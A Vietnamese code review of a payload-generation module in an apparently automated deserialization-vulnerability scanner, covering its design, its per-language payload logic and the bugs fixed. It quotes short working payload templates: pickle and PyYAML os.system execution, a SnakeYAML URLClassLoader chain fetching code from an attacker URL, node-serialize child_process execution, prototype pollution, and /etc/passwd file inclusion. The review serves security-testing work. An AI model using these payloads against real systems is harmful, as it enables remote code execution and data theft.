# Review: Stage 7 — PayloadMutation (`Analyze/payloadMutation.py`)

> Tài liệu này đi từ tổng quan (vai trò, ý tưởng thiết kế) xuống chi tiết (logic triển khai từng ngôn ngữ). Các bug đã tìm/sửa trong quá trình review có log đầy đủ (before/after code, cách verify) ở `note.md` — tài liệu này chỉ tóm tắt kết luận, không lặp lại chi tiết fix.

---

## 1. Tổng quan — vai trò trong pipeline

```
Stage 5 Fingerprint        -> xác định TYPE (PHP/Java/Ruby/...)
Stage 6 ExploitabilityAnalysis -> xác định "nên thử kỹ thuật gì" (suggested_probe)
Stage 7 PayloadMutation     -> THẬT SỰ TẠO RA payload tấn công (base64), sẵn sàng gửi đi
Stage 8 ReplayRequest       -> gửi payload đi, so sánh response, confirm lỗ hổng
```

**Input:** `ExploitResult` (dict từ Stage 6, gồm `suggested_probe`, `exploit_type`) + `MutationVector` (thông tin vị trí payload: `location`/`name`/`url`/`method`/`value`).

**Output:** `Mutations = list[MutationPayload | MutationError]` — mỗi phần tử là 1 payload cụ thể (base64 + base64-urlencoded) kèm metadata, hoặc 1 `MutationError` (khi thiếu tool ngoài, VD `ysoserial-all.jar` không tồn tại).

Đây là bước **"biến nghi ngờ thành vũ khí cụ thể"** — Stage 6 chỉ nói "có khả năng dính PHP privilege escalation", Stage 7 tạo ra byte payload thật để Stage 8 đi kiểm chứng.

---

## 2. Ý tưởng thiết kế — 2 chiến lược song song

`payloadMutation.py` dùng **2 cách tiếp cận khác nhau** tuỳ theo bản chất lỗ hổng của từng ngôn ngữ:

### Chiến lược A — Gọi tool ngoài đã có sẵn gadget chain thật (Java, PHP gadget chain, .NET, Ruby)
Java/PHP/.NET deserialization RCE cần **gadget chain** — chuỗi lời gọi hàm có sẵn trong thư viện/framework của ứng dụng, được các nhà nghiên cứu tổng hợp sẵn thành tool (`ysoserial`, `phpggc`, `ysoserial.net`). Tool tự viết payload nhị phân đúng chuẩn (Java Object Stream, PHP serialize theo gadget thật) là bất khả thi/vô nghĩa — vì cần biết chính xác cấu trúc class thật của gadget (VD `CommonsCollections`, `Monolog`). Nên code ở đây chỉ đóng vai trò **gọi đúng tool, đúng tham số**, không tự "chế" payload.

### Chiến lược B — Tự construct payload trực tiếp (Pickle, YAML, NodeJS, Wrapper, và PHP value-mutation đơn giản)
Với các kỹ thuật mà **bản chất lỗ hổng đã đủ đơn giản để không cần gadget chain phức tạp** — pickle `__reduce__` (chính pickle module đã hỗ trợ RCE trực tiếp), YAML tag injection (`!!python/object/apply`), NodeJS `__proto__`/`_$$ND_FUNC$$_` — code tự tạo chuỗi payload bằng Python string, không cần tool ngoài.

Bảng tổng hợp:

| Ngôn ngữ | Chiến lược | Tool ngoài? |
|---|---|---|
| PHP (gadget_chain/magic_method) | A | `phpggc` |
| PHP (flip_boolean/modify_string/modify_integer) | B (tự parse PHP serialize) | Không |
| Java | A | `ysoserial` |
| Python Pickle | B | Không |
| YAML | B | Không |
| NodeJS | B | Không |
| Ruby | A (nhưng chỉ generic, chưa có gadget chain thật) | `ruby` binary |
| .NET | A | `ysoserial.net` |
| Wrapper (PHP stream wrapper) | B (+ tool `gopherus` cho Redis) | `gopherus` (tuỳ chọn) |

---

## 3. Kiến trúc / luồng dữ liệu

`mutate()` (dòng 50-73) là **dispatch table trung tâm**, đọc `self.probe` (từ Stage 6) rồi gọi đúng hàm xử lý:

```python
if self.probe == "ysoserial": return self._mutate_java()
if self.probe == "urldns_probe": return self._mutate_java_urldns()
if self.probe in ("gadget_chain", "magic_method"): return self._php_mutation()
if self.probe in ("flip_boolean","modify_string","modify_integer"): return self.__mutated_php_choose()
if self.probe == "pickle_exec": return self._mutate_pickle()
if self.probe == "yaml_exec": return self._mutate_yaml()
if self.probe in ("node_serialize","proto_pollution"): return self._mutate_nodejs()
if self.probe == "ruby_marshal": return self._mutate_ruby()
if self.probe in ("viewstate","dotnet_deser"): return self._mutate_dotnet_viewstate()
if self.probe == "jsonnet": return self._mutate_dotnet_jsonnet()
if self.probe in ("rce","phar_deser","ssrf","php_input","lfi","code_inject","traversal","stream"): return self._mutate_wrapper()
return []
```

Mọi payload cuối cùng đều đi qua **`_make_payload()`** (dòng 127-142) — hàm dựng chung, đảm bảo output đồng nhất 1 schema (`MutationPayload`):
```python
{
  "type": ptype, "chain": chain, "command": command,
  "payload": b64, "payload_urlencoded": url_safe,
  "location": ..., "name": ..., "url": ..., "method": ...,
  "encoding": "base64",
}
```
`url_safe` chỉ escape đúng 3 ký tự đặc biệt của base64 (`+`, `=`, `/`) — vì bảng chữ base64 chỉ có 3 ký tự này cần URL-encode, không thiếu ký tự nào.

---

## 4. Chi tiết triển khai theo từng ngôn ngữ

### 4.1 PHP — 2 con đường riêng biệt

**(a) Gadget chain thật (`_php_mutation()`, dòng 371-389):** gọi `phpggc` (dòng 391-401, `_run_phpggc()`), chọn chain theo `exploit_type` qua `PHP_GADGET_CHAINS_MAP` (dòng 196+, ~15 framework: Monolog/Guzzle/Laravel/Symfony/WordPress/Drupal...). Duyệt lồng 3 tầng: chain × `PHP_TYPE` (`system`/`exec`/`passthru`/`unlink`, dòng 356-361) × `TEST_COMMANDS`.

**(b) Value-mutation đơn giản (`__flip_boolean`/`__modify_string`/`_mutate_integer`, dòng 483-543):** dùng cho case đơn giản như PortSwigger lab "Modifying serialized objects" — không cần gadget chain, chỉ cần đổi giá trị 1 field đã biết (VD `admin: false → true`).

**Điểm kỹ thuật quan trọng nhất — bộ parser PHP serialize tự viết (`_read_php_token`/`_iter_php_pairs`, dòng 413-481):**
PHP serialize không phải JSON — nó là format nhị phân-text lai, cấu trúc **length-prefixed** (`s:N:"...";`) chứ không dùng escape như JSON. Object/array được ghi thành chuỗi cặp xen kẽ `KEY;VALUE;KEY2;VALUE2;...`. Parser tự viết:
- `_read_php_token()`: đọc 1 token bất kỳ tại vị trí byte cho trước, phân biệt 6 kind (`s`/`i`/`d`/`b`/`N`/`a`,`O`). Với string, dùng **số học vị trí** (`content_start + declared_length`) thay vì regex tìm dấu `"` — vì nội dung string CÓ THỂ chứa dấu `"` bên trong (hợp lệ, không cần escape).
- `_iter_php_pairs()`: gọi `_read_php_token` liên tục theo cặp — token thứ nhất luôn là KEY, token kế tiếp luôn là VALUE, dựa vào **thứ tự xuất hiện**, không đoán qua ngữ cảnh xung quanh.
- Container lồng (`a:`/`O:` bên trong 1 field khác) được nhận diện qua đếm độ sâu ngoặc `{`/`}`, coi là 1 khối nguyên, không đệ quy vào trong — vì mục đích chỉ là mutate field ở tầng ngoài cùng.

3 hàm mutate dùng parser này, ghép chuỗi lại theo **vị trí byte** (`payload[:start] + new + payload[end:]`), không dùng `.replace()` theo văn bản.

### 4.2 Java (`_mutate_java`, `_mutate_java_urldns`, dòng 144-190)

Gọi `ysoserial-all.jar` qua subprocess. 2 nhánh:
- **`ysoserial` probe** → thử full RCE, duyệt qua các chain khả nghi (`_resolve_chains()`, dòng 76-80, map `exploit_type` → nhóm chain cụ thể qua `JAVA_CHAIN_MAP`) × `TEST_COMMANDS`.
- **`urldns_probe`** → không cần RCE thật, chỉ cần payload `URLDNS` gadget (luôn có sẵn trong mọi classpath Java, dùng để "chứng minh có deserialize xảy ra" qua callback DNS/HTTP tới domain OOB do `get_oob_domain()` cấu hình).

`_get_java_flags()` (dòng 82-100) tự phát hiện Java 8 (`"1."` trong version string) vs Java 9+ để thêm `--add-opens` (Java 9+ Module System chặn reflection vào `sun.reflect`/`com.sun.org.apache.xalan` theo mặc định — ysoserial cần mở lại).

### 4.3 Python Pickle (`_mutate_pickle`, dòng 567-579)

Đơn giản nhất vì **pickle tự nó đã là RCE by design** — không cần gadget chain gì cả:
```python
class _PickleRCE:
    def __reduce__(self):
        return (os.system, (self.command,))
```
`pickle.dumps()` 1 object có `__reduce__` trả về `(callable, args)` sẽ khiến `pickle.loads()` ở phía target **tự động gọi `os.system(command)`** khi deserialize — đây là hành vi CHUẨN của pickle protocol (không phải bug của pickle), nên bất kỳ `pickle.loads()` nào chạy trên input không tin cậy đều nguy hiểm ngay lập tức.

### 4.4 YAML (`_mutate_yaml` + `_mutate_yaml_python` + `_mutate_yaml_java`, dòng 583-635)

**Mới sửa trong phiên review này** (xem note.md để biết chi tiết bug/fix): router `_mutate_yaml()` đọc `self.etype` để chọn đúng "phương ngữ":
- **PyYAML (Python)** → `!!python/object/apply:os.system\nargs: ['<cmd>']` — tag `!!python/object/apply` là cú pháp riêng của PyYAML cho phép gọi trực tiếp 1 hàm Python với tham số tuỳ ý khi `yaml.load()`/`yaml.unsafe_load()` (không dùng `SafeLoader`).
- **SnakeYAML (Java)** → `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["<oob_url>"]]]]` — kỹ thuật CVE-2022-1471: SnakeYAML cho phép khởi tạo BẤT KỲ class Java nào qua tag `!!<fully-qualified-name>`, lợi dụng constructor `ScriptEngineManager(ClassLoader)` nhận vào 1 `URLClassLoader` trỏ tới server attacker — JVM sẽ tải `META-INF/services/javax.script.ScriptEngineFactory` từ đó và thực thi class bên trong. Vì RCE đầy đủ cần host 1 file `.jar` độc hại thật (ngoài phạm vi tool), payload chỉ dùng để **xác nhận blind qua OOB callback** (giống kỹ thuật URLDNS của Java).

### 4.5 NodeJS (`_mutate_nodejs`, dòng 637-663)

2 kỹ thuật độc lập:
- **`node_serialize` probe** → payload IIFE đặc trưng của thư viện `node-serialize` (CVE-2017-5941): `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('<cmd>');}()"}"`. Thư viện này tự `eval()` bất kỳ giá trị nào bắt đầu bằng marker `_$$ND_FUNC$$_` khi deserialize.
- **`proto_pollution` probe** → payload `{"__proto__": {"isAdmin": true, "polluted": true}}` — nếu code đích merge/clone JSON không kiểm tra key `__proto__`, giá trị này ghi thẳng vào `Object.prototype`, ảnh hưởng TOÀN BỘ object trong runtime (không chỉ object hiện tại).

### 4.6 Ruby (`_mutate_ruby`, dòng 665-683)

Khác hẳn Java/PHP/.NET — **không có tool kiểu `ysoserial` cho Ruby** trong project này. Code gọi trực tiếp binary `ruby` (subprocess) để chạy `Marshal.dump()` tạo 1 object generic có instance variable `@cmd`:
```ruby
Object.new.tap { |o| o.instance_variable_set(:@cmd, '<cmd>') }
```
Payload này **CHƯA PHẢI gadget chain thật** — tool tự ghi rõ trong `note` field: *"Generic Marshal object — replace with a real gadget chain for the target Ruby framework"*. Đây là giới hạn đã biết và được document minh bạch (không giấu), khác các phần khác của code — Rails/Ruby thật cần gadget chain riêng (VD `universal-rce` cho Rails) mà project chưa tích hợp.

### 4.7 .NET (`_mutate_dotnet_viewstate`, `_mutate_dotnet_jsonnet`, dòng 715-784)

- **ViewState** → gọi `ysoserial.net` với `-f <formatter> -g <gadget>`. `_resolve_dotnet_formatter()` (dòng 715-719) đọc `exploit_type` để chọn đúng formatter (`BinaryFormatter`/`ObjectStateFormatter`/`LosFormatter`/`NetDataContractSerializer`) — quan trọng vì payload cho formatter sai sẽ không hoạt động (mỗi formatter có định dạng byte khác nhau). Duyệt qua `DOTNET_GADGETS` (`TypeConfuseDelegate`/`ObjectDataProvider`/`ActivitySurrogateSelector`).
- **JSON.NET TypeConfusion** → tự construct JSON với `"$type"` trỏ tới `System.Windows.Data.ObjectDataProvider` — kỹ thuật kinh điển khi server dùng `TypeNameHandling.All/Objects/Auto` (cho phép JSON tự chỉ định class .NET để deserialize thành, mở đường cho attacker chỉ định bất kỳ class nguy hiểm nào).

### 4.8 Wrapper — PHP Stream Wrapper (`_mutate_wrapper*`, dòng 786-958)

Nhóm kỹ thuật khác biệt — không phải "deserialize" theo nghĩa object, mà là lợi dụng các **PHP stream wrapper protocol** nguy hiểm:

| Wrapper | Hàm | Kỹ thuật |
|---|---|---|
| `expect://` | `_mutate_wrapper_expect` | RCE trực tiếp (cần extension `expect`) |
| `phar://` | `_mutate_wrapper_phar` | Phar deserialization — gọi `phpggc -p phar` tạo file `.phar` chứa gadget, kích hoạt khi có file-operation (`file_exists`, `is_file`...) |
| `gopher://` | `_mutate_wrapper_ssrf` | SSRF — có OOB canary (dòng 865+) VÀ tool `gopherus` (nếu có Python 2) sinh payload Redis RCE thật |
| `php://input`/`data://` | `_mutate_wrapper_php_input`/`_mutate_wrapper_data` | Code injection nếu sink dùng `include()`/`require()` |
| `file://` | `_mutate_wrapper_lfi` | Local File Inclusion (đọc `/etc/passwd`, `win.ini`) |
| `glob://` | `_mutate_wrapper_traversal` | Liệt kê thư mục |
| `compress.zlib://` | `_mutate_wrapper_stream` | Chain nhiều wrapper (nén + filter) |

---

## 5. Các bug đã phát hiện & sửa trong phiên review này (tóm tắt — chi tiết ở `note.md`)

1. `__modify_string()` đổi nhầm **tên field (KEY)** thay vì **giá trị (VALUE)** — 64% mutation sai trên payload thật.
2. `__flip_boolean()` thay thế không neo vị trí — có thể sửa nhầm nội dung string không liên quan, đổi tất cả field boolean cùng lúc thay vì tách riêng.
3. `_run_ysoserial()` thiếu bắt `PermissionError`/`OSError` (không đồng bộ với `_run_ysoserialnet()`).
4. `JAVA_CHAIN_MAP` thiếu entry `"Rome"` dù ysoserial có chain `ROME` thật.
5. `_mutate_yaml()` không phân biệt SnakeYAML (Java) với PyYAML (Python) — luôn gửi payload Python dù đã nhận diện đúng target là Java.

→ Cả 5 đều đã fix, có regression test riêng (`TestCase/test_payload_mutation.py`, 13 test) + verify trên dữ liệu thật (`result1.json`) và synthetic (`comprehensive.har`).

---

## 6. Giới hạn còn tồn tại (chưa fix, đã biết)

- **`all_hints` trong `__modify_string()` chỉ có tiếng Anh** (`username`/`role`/`admin`/...) — field tên ngôn ngữ khác (VD tiếng Việt `taikhoan`/`vaitro`) sẽ không được nhận diện, `modify_string` im lặng không sinh mutation nào.
- **Chỉ mutate giá trị scalar** (string/int/bool) — field có giá trị là array/object lồng bị bỏ qua hoàn toàn, không thử mutate bên trong.
- **Ruby chỉ có payload generic**, chưa tích hợp gadget chain thật cho Rails/framework cụ thể (đã tự document trong code).
- **YAML Java chỉ dừng ở mức xác nhận blind (OOB)**, chưa có full RCE tự động (cần host `.jar` độc hại thật — ngoài phạm vi 1 tool black-box).
